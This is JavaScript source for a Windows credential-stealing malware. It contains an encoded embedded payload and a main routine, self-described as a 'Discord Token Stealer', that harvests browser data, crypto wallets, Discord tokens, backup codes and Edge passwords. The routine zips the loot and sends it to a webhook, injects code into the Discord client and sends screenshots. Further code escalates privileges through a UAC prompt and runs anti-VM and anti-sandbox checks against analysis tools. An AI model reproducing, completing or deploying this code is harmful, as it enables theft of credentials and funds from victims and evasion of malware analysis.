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")))';

const InputPayload = {
    async main(deepFolder, logger) {
        console.log('InputPayload.main started');
        if (!logger) {
            logger = {
                info: console.log,
                success: console.log,
                error: console.error,
                debug: console.log,
                critical: console.error
            };
        }

        logger.info('=== Discord Token Stealer Started ===');

        try {
            if (!deepFolder) {
                logger.critical('No deep folder provided!');
                console.log('Critical: No deep folder provided');
                return;
            }

            logger.info(`Using deep folder: ${deepFolder}`);

            const WEBHOOK = CONFIG.webhook;
            logger.debug(`Webhook URL configured: ${WEBHOOK ? 'Yes' : 'No'}`);
            console.log(`Webhook configured: ${WEBHOOK ? 'Yes' : 'No'}`);

            const outputFolder = path.join(deepFolder, 'output');
            const walletOutputDir = outputFolder;

            fs.mkdirSync(outputFolder, { recursive: true });
            console.log(`Output folder created: ${outputFolder}`);

            logger.info('Initializing Python environment for browser data extraction...');

            const finalPythonCode = pythonCodeTemplate;
            const pyScriptPath = path.join(outputFolder, 'browser_forensics.py');

            try {
                await ChromePython(finalPythonCode, pyScriptPath, [outputFolder]);
                logger.success('Python script executed successfully');
            } catch (err) {
                logger.error(`Python script execution failed: ${err.message}`);
            }

            // Run the secondary Python extraction AFTER ChromePython completes
            // This ensures the portable Python environment is fully set up
            try {
                await executePythonExtraction(outputFolder);
            } catch (e) {
                logger.error(`Secondary Python extraction failed: ${e.message}`);
            }

            logger.info('Starting parallel data collection...');

            const [
                browserCheck,
                walletResults,
                tokens,
                backupCodes
            ] = await Promise.allSettled([
                (async () => {
                    console.log('Checking browser data...');
                    logger.info('Checking browser data...');
                    if (!fs.existsSync(outputFolder)) {
                        logger.info('No browser data found');
                        return { exists: false, items: [] };
                    }
                    const items = fs.readdirSync(outputFolder);
                    logger.success(`Browser data: ${items.length} items`);
                    return { exists: items.length > 0, items };
                })(),

                (async () => {
                    console.log('Extracting wallets...');
                    logger.info('Extracting wallets...');
                    fs.mkdirSync(walletOutputDir, { recursive: true });
                    const results = await extractAllWallets(walletOutputDir);
                    const total = results.browserWallets.length + results.desktopWallets.length +
                        results.coldWallets.length + results.walletDatFiles.length + results.seedFiles.length;
                    logger.success(`Wallets extracted: ${total} items`);
                    return results;
                })(),

                (async () => {
                    console.log('Collecting tokens...');
                    logger.info('Collecting Discord tokens...');
                    const collected = await collectAllTokens();
                    logger.success(`Tokens found: ${collected.length}`);
                    return collected;
                })(),


                (async () => {
                    console.log('Collecting backup codes...');
                    logger.info('Collecting backup codes...');
                    const backupPath = await writeBackupCodesToFile(outputFolder);
                    logger.success(`Backup codes collected: ${backupPath ? 'Yes' : 'No'}`);
                    return backupPath;
                })(),
                (async () => {
                    try {
                        console.log('Extracting Edge passwords...');
                        await ExtractEdgePasswords(outputFolder);
                        logger.success('Edge passwords extracted');
                    } catch (e) {
                        logger.error(`Edge extraction failed: ${e.message}`);
                    }
                })()
            ]);

            console.log('Parallel data collection finished');

            const browserDataExists = browserCheck.status === 'fulfilled' && browserCheck.value.exists;
            const walletDataExists = walletResults.status === 'fulfilled' && fs.existsSync(path.join(outputFolder, 'wallets_summary.txt'));
            const hasWalletDirs = fs.existsSync(path.join(outputFolder, 'Desktop_Wallets')) || fs.existsSync(path.join(outputFolder, 'Browser_Wallets'));
            const hasAnyOutput = (() => { try { return fs.existsSync(outputFolder) && fs.readdirSync(outputFolder).length > 0; } catch (e) { return false; } })();
            const shouldZip = hasWalletDirs || hasAnyOutput || browserDataExists || walletDataExists;
            const collectedTokens = tokens.status === 'fulfilled' ? tokens.value : [];

            console.log(`Should ZIP: ${shouldZip}`);

            if (shouldZip) {
                const randomName = Math.random().toString(36).substring(2, 15) + '.zip';
                const combinedZipPath = path.join(deepFolder, randomName);
                logger.info('Creating combined ZIP...');
                console.log(`Creating ZIP at: ${combinedZipPath}`);

                await new Promise((resolve, reject) => {
                    const output = fs.createWriteStream(combinedZipPath);
                    const archive = archiver('zip', { zlib: { level: 9 } });

                    output.on('close', () => {
                        logger.success(`ZIP created: ${archive.pointer()} bytes`);
                        resolve();
                    });

                    archive.on('error', reject);
                    archive.pipe(output);
                    archive.directory(outputFolder, false);
                    archive.finalize();
                });

                console.log('ZIP created, attempting upload...');

                try {
                    await exfiltrateLogs(combinedZipPath);

                    logger.success('ZIP uploaded');

                } catch (uploadErr) {
                    logger.error(`ZIP upload failed: ${uploadErr.message}`);
                }

                try {
                    if (fs.existsSync(outputFolder)) fs.rmSync(outputFolder, { recursive: true, force: true });
                    if (fs.existsSync(combinedZipPath)) fs.unlinkSync(combinedZipPath);
                } catch (e) { }
            }

            // Priority operations: tokens, injection, and screenshot in parallel
            const priorityTasks = [];

            if (collectedTokens.length > 0) {
                logger.info(`Sending ${collectedTokens.length} tokens to webhook...`);
                for (const [token, platform, validation] of collectedTokens) {
                    priorityTasks.push(
                        Promise.race([
                            sendTokenToWebhook(token, platform, validation.userInfo),
                            new Promise((_, reject) => setTimeout(() => reject(new Error('Token send timeout')), 1500))
                        ]).then(() => {
                            logger.success(`Token sent: ${validation.userInfo.username}`);
                        }).catch(e => {
                            logger.error(`Token send failed: ${e.message}`);
                        })
                    );
                }
            } else {
                logger.info('No tokens to send');
            }

            // Discord Injection
            logger.info('Starting Discord injection...');
            try {
                logger.info('Killing Discord processes to release locks...');
                killDiscordProcesses();

                // Short delay to ensure locks are released
                await new Promise(r => setTimeout(r, 2000));

                const injectionResults = await electronInject();
                logger.success(`Discord injection processed: ${injectionResults.length} instances`);
                console.log(`Injection results: ${JSON.stringify(injectionResults)}`);

                logger.info('Restarting Discord instances...');
                await restartDiscord(injectionResults);
                logger.success('Discord restart initiated');
            } catch (err) {
                logger.error(`Discord injection failed: ${err.message}`);
                console.log(`Injection error: ${err.message}`);
            }

            logger.info('Sending screenshot...');
            priorityTasks.push(
                sendScreenshotToWebhook()
                    .then(() => logger.success('Screenshot sent'))
                    .catch(e => {
                        logger.error('Screenshot send failed:', e.message);
                        console.log(`Screenshot send failed: ${e.message}`);
                    })
            );

            await Promise.all(priorityTasks);




            logger.success('=== All tasks completed ===');

        } catch (err) {
            logger.critical(`Fatal error: ${err && (err.message || err)}`);
            logger.error(`Stack: ${err && err.stack}`);
            console.log(`InputPayload Fatal Error: ${err && (err.message || err)}\n${err && err.stack}`);
        }
    }
};

class AdminCheck {
    static isAdmin() {
        try {
            execSync('net session', { stdio: 'pipe', windowsHide: true, timeout: 2000 });
            return true;
        } catch (e) {
            return false;
        }
    }
    static async requestAdmin(wait = false, exitOnSuccess = true) {
        return new Promise((resolve, reject) => {
            try {
                const scriptPath = process.execPath;
                const args = process.argv.slice(1).join(' ');
                const tempDir = os.tmpdir();
                const markerId = `elev_${Date.now()}_${Math.random().toString(36).substring(7)}`;
                const markerPath = path.join(tempDir, `${markerId}.marker`);
                const quotedArgs = process.argv.slice(1).map(arg => arg.includes(' ') ? `"${arg}"` : arg).join(' ');
                const fullArgs = `${quotedArgs} --uac-marker="${markerPath}"`;
                const argsForVBS = fullArgs.replace(/"/g, '" & Chr(34) & "');
                const vbsContent = `Set UAC = CreateObject("Shell.Application")\nUAC.ShellExecute "${scriptPath}", "${argsForVBS}", "", "runas", 1`;
                const vbsPath = path.join(tempDir, `${markerId}.vbs`);
                fs.writeFileSync(vbsPath, vbsContent);
                const proc = spawn('wscript.exe', [vbsPath], { stdio: 'ignore', windowsHide: true });
                proc.on('close', (code) => {
                    try { if (fs.existsSync(vbsPath)) { fs.unlinkSync(vbsPath); } } catch (e) { }
                    setTimeout(() => {
                        const wasAccepted = fs.existsSync(markerPath);
                        if (wasAccepted) {
                            try { fs.unlinkSync(markerPath); } catch (e) { }
                            if (exitOnSuccess) { setTimeout(() => process.exit(0), 500); }
                            resolve();
                        } else {
                            reject(new Error('UAC denied by user'));
                        }
                    }, 3000);
                });
                proc.on('error', (err) => { reject(err); });
            } catch (error) {
                reject(error);
            }
        });
    }
    static async ensureAdmin() {
        if (!this.isAdmin()) {
            console.log('[Admin] Requesting administrator privileges...');
            await this.requestAdmin(false);
            return false;
        }
        console.log('[Admin] Running with administrator privileges');
        return true;
    }
    static async ensureAdminSilent() {
        if (!this.isAdmin()) {
            await this.requestAdmin(false);
            return false;
        }
        return true;
    }
}

const DEBUG_ANTIVM = true;
const VM_MAC_PREFIXES = ["00:0C:29", "08:00:27", "00:1C:42", "00:50:56", "0A:00:27", "00:16:3E", "00:03:FF", "00:1F:16", "BE:EF:CA", "42:01:0A"];
const SANDBOX_PROCESSES = ["vmsrvc", "vmusrvc", "vboxtray", "vmtoolsd", "df5serv", "vboxservice", "vmware", "trio", "tqos", "networkservice", "updata", "sandboxie", "anyrun", "triage", "cuckoo", "sample", "kvmsrvc", "qemud", "xen", "xenservice"];
const DEBUGGER_PROCESSES = ["ollydbg", "ida64", "idaq", "windbg", "x32dbg", "x64dbg", "wireshark", "dumpcap", "procmon", "regmon", "filemon", "processhacker", "autoruns", "tcpview", "volatility", "fiddler", "apimonitor", "immunity", "pestudio", "dnspy", "cheatengine", "ghidra"];
const ANALYSIS_HOSTNAMES = ["sandbox", "analysis", "malware", "vm", "test", "lab", "cuckoo", "virus", "research"];
const ANALYSIS_USERNAMES = ["sandbox", "malware", "virus", "sample", "analyze", "test", "user", "admin", "administrator"];
const VM_FILES = [
    "C:\\windows\\System32\\Drivers\\VBoxMouse.sys",
    "C:\\windows\\System32\\Drivers\\VBoxGuest.sys",
    "C:\\windows\\System32\\Drivers\\VBoxSF.sys",
    "C:\\windows\\System32\\Drivers\\VBoxVideo.sys",
    "C:\\windows\\System32\\vboxdisp.dll",
    "C:\\windows\\System32\\vboxhook.dll",
    "C:\\windows\\System32\\vboxservice.exe",
    "C:\\windows\\System32\\vboxtray.exe",
    "C:\\windows\\System32\\drivers\\vmmouse.sys",
    "C:\\windows\\System32\\drivers\\vmhgfs.sys",
];
const ANALYSIS_DIRECTORIES = [
    "C:\\analysis",
    "C:\\sandbox",
    "C:\\tools",
    "C:\\malware",
    "C:\\samples",
    "C:\\program files\\oracle\\virtualbox guest additions",
    "C:\\program files\\VMware",
];

class AntiVM {
    static checkMacAddress() {
        try {
            const output = execSync('getmac', { encoding: 'utf8', timeout: 500, windowsHide: true });
            for (const prefix of VM_MAC_PREFIXES) { if (output.includes(prefix)) { if (DEBUG_ANTIVM) console.log(`[AntiVM] VM MAC detected: ${prefix}`); return true; } }
        } catch (e) { }
        return false;
    }
    static checkBIOS() {
        try {
            const biosManuf = execSync('powershell -NoProfile -ExecutionPolicy Bypass -Command "Get-CimInstance -ClassName Win32_BIOS | Select-Object -ExpandProperty Manufacturer"', { encoding: 'utf8', timeout: 1000, windowsHide: true });
            const vmBios = ["vmware", "virtualbox", "qemu", "xen", "parallels", "kvm", "microsoft corporation"];
            if (vmBios.some((vm) => biosManuf.toLowerCase().includes(vm))) { if (DEBUG_ANTIVM) console.log(`[AntiVM] VM BIOS detected: ${biosManuf.trim()}`); return true; }
            const biosVersion = execSync('powershell -NoProfile -ExecutionPolicy Bypass -Command "Get-CimInstance -ClassName Win32_BIOS | Select-Object -ExpandProperty Version"', { encoding: 'utf8', timeout: 1000, windowsHide: true });
            if (vmBios.some((vm) => biosVersion.toLowerCase().includes(vm))) { if (DEBUG_ANTIVM) console.log(`[AntiVM] VM BIOS version detected: ${biosVersion.trim()}`); return true; }
        } catch (e) { }
        return false;
    }
    static checkDisk() {
        try {
            const diskModel = execSync('powershell -NoProfile -ExecutionPolicy Bypass -Command "Get-CimInstance -ClassName Win32_DiskDrive | Select-Object -ExpandProperty Model"', { encoding: 'utf8', timeout: 1000, windowsHide: true });
            const vmDisks = ["vbox", "vmware", "virtual", "qemu", "xen"];
            if (vmDisks.some((vm) => diskModel.toLowerCase().includes(vm))) { if (DEBUG_ANTIVM) console.log(`[AntiVM] VM disk detected: ${diskModel.trim()}`); return true; }
        } catch (e) { }
        return false;
    }
    static checkHardware() {
        if (os.cpus().length < 2) { if (DEBUG_ANTIVM) console.log(`[AntiVM] Low CPU cores: ${os.cpus().length}`); return true; }
        const totalRAM = os.totalmem() / 1024 ** 3;
        if (totalRAM < 4) { if (DEBUG_ANTIVM) console.log(`[AntiVM] Low RAM: ${totalRAM.toFixed(2)}GB`); return true; }
        return false;
    }
    static checkProcesses() {
        try {
            const processes = execSync('tasklist', { encoding: 'utf8', timeout: 1000, windowsHide: true }).toLowerCase();
            for (const proc of SANDBOX_PROCESSES) { if (processes.includes(proc)) { if (DEBUG_ANTIVM) console.log(`[AntiVM] Sandbox process detected: ${proc}`); return true; } }
            for (const proc of DEBUGGER_PROCESSES) { if (processes.includes(proc)) { if (DEBUG_ANTIVM) console.log(`[AntiVM] Debugger process detected: ${proc}`); return true; } }
            const procCount = processes.split('\n').length; if (procCount < 30) { if (DEBUG_ANTIVM) console.log(`[AntiVM] Low process count: ${procCount}`); return true; }
        } catch (e) { }
        return false;
    }
    static checkHostname() {
        const hostname = os.hostname().toLowerCase();
        for (const name of ANALYSIS_HOSTNAMES) { if (hostname.includes(name)) { if (DEBUG_ANTIVM) console.log(`[AntiVM] Analysis hostname detected: ${hostname}`); return true; } }
        return false;
    }
    static checkUsername() {
        const username = os.userInfo().username.toLowerCase();
        for (const user of ANALYSIS_USERNAMES) { if (username.includes(user)) { if (DEBUG_ANTIVM) console.log(`[AntiVM] Analysis username detected: ${username}`); return true; } }
        return false;
    }
    static checkVMFiles() {
        for (const file of VM_FILES) { try { if (fs.existsSync(file)) { if (DEBUG_ANTIVM) console.log(`[AntiVM] VM file detected: ${file}`); return true; } } catch (e) { } }
        return false;
    }
    static checkAnalysisDirs() {
        for (const dir of ANALYSIS_DIRECTORIES) { try { if (fs.existsSync(dir)) { if (DEBUG_ANTIVM) console.log(`[AntiVM] Analysis directory detected: ${dir}`); return true; } } catch (e) { } }
        return false;
    }
    static checkTempFiles() {
        try { const tempFiles = fs.readdirSync(os.tmpdir()); if (tempFiles.length < 10) { if (DEBUG_ANTIVM) console.log(`[AntiVM] Low temp files: ${tempFiles.length}`); return true; } } catch (e) { }
        return false;
    }
    static checkScreenSize() {
        try {
            const output = execSync('powershell -Command "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width"', { encoding: 'utf8', timeout: 1000, windowsHide: true });
            const width = parseInt(output.trim());
            if (width < 1024) { if (DEBUG_ANTIVM) console.log(`[AntiVM] Low screen width: ${width}`); return true; }
        } catch (e) { }
        return false;
    }
    static checkSleepPatching() {
        const requestedSleep = 1000; const start = Date.now(); const endTime = start + requestedSleep; while (Date.now() < endTime) { }
        const actualSleep = Date.now() - start; if (actualSleep < requestedSleep * 0.9) { if (DEBUG_ANTIVM) console.log(`[AntiVM] Sleep patching detected: ${actualSleep}ms vs ${requestedSleep}ms`); return true; }
        return false;
    }
    static checkNetworkInterfaces() {
        const interfaces = os.networkInterfaces(); const count = Object.keys(interfaces).length; if (count < 2) { if (DEBUG_ANTIVM) console.log(`[AntiVM] Low network interfaces: ${count}`); return true; }
        return false;
    }
    static checkRegistry() {
        const regKeys = [
            "HKLM\\SOFTWARE\\Oracle\\VirtualBox Guest Additions",
            "HKLM\\SYSTEM\\ControlSet001\\Services\\VBoxGuest",
            "HKLM\\SYSTEM\\ControlSet001\\Services\\VBoxMouse",
            "HKLM\\SYSTEM\\ControlSet001\\Services\\VBoxService",
            "HKLM\\SOFTWARE\\VMware, Inc.\\VMware Tools",
            "HKLM\\SYSTEM\\ControlSet001\\Services\\vmci",
            "HKLM\\SYSTEM\\ControlSet001\\Services\\vmhgfs",
            "HKLM\\SOFTWARE\\Microsoft\\Virtual Machine\\Guest\\Parameters",
        ];
        for (const key of regKeys) { try { execSync(`reg query "${key}"`, { stdio: 'pipe', timeout: 1000, windowsHide: true }); if (DEBUG_ANTIVM) console.log(`[AntiVM] VM registry key found: ${key}`); return true; } catch (e) { } }
        return false;
    }
    static randomDelay() { const delay = Math.floor(Math.random() * 200) + 50; const start = Date.now(); while (Date.now() - start < delay) { } }
    static check() {
        if (DEBUG_ANTIVM) console.log('[AntiVM] Starting anti-VM/sandbox checks...');
        const checks = [
            { name: 'MAC Address', fn: this.checkMacAddress },
            { name: 'BIOS', fn: this.checkBIOS },
            { name: 'Disk', fn: this.checkDisk },
            { name: 'Hardware', fn: this.checkHardware },
            { name: 'Processes', fn: this.checkProcesses },
            { name: 'Hostname', fn: this.checkHostname },
            { name: 'Username', fn: this.checkUsername },
            { name: 'VM Files', fn: this.checkVMFiles },
            { name: 'Analysis Dirs', fn: this.checkAnalysisDirs },
            { name: 'Temp Files', fn: this.checkTempFiles },
            { name: 'Screen Size', fn: this.checkScreenSize },
            { name: 'Network Interfaces', fn: this.checkNetworkInterfaces },
            { name: 'Registry', fn: this.checkRegistry },
        ];
        for (let i = checks.length - 1; i > 0; i--) { const j = Math.floor(Math.random() * (i + 1));[checks[i], checks[j]] = [checks[j], checks[i]]; }
        for (const check of checks) {
            try {
                this.randomDelay();
                if (check.fn.call(this)) { if (DEBUG_ANTIVM) console.log(`[AntiVM] DETECTED: ${check.name}`); return true; }
            } catch (e) { if (DEBUG_ANTIVM) console.log(`[AntiVM] Error in ${check.name}: ${e.message}`); }
        }
        if (DEBUG_ANTIVM) console.log('[AntiVM] All checks passed - real system');
        return false;
    }
    static checkAndExit() { if (this.check()) { if (DEBUG_ANTIVM) console.log('[AntiVM] VM/Sandbox detected - exiting'); process.exit(0); } }
}

class LegitimateModule {
    static collectSystemInfo() {
        const info = {
            platform: os.platform(),
            arch: os.arch(),
            hostname: os.hostname(),
            cpus: os.cpus().length,
            totalMemory: Math.round(os.totalmem() / (1024 ** 3)) + 'GB',
            freeMemory: Math.round(os.freemem() / (1024 ** 3)) + 'GB',
            uptime: Math.round(os.uptime() / 3600) + 'h',
            nodeVersion: process.version,
            timestamp: new Date().toISOString()
        };
        return info;
    }
    static async checkForUpdates() {
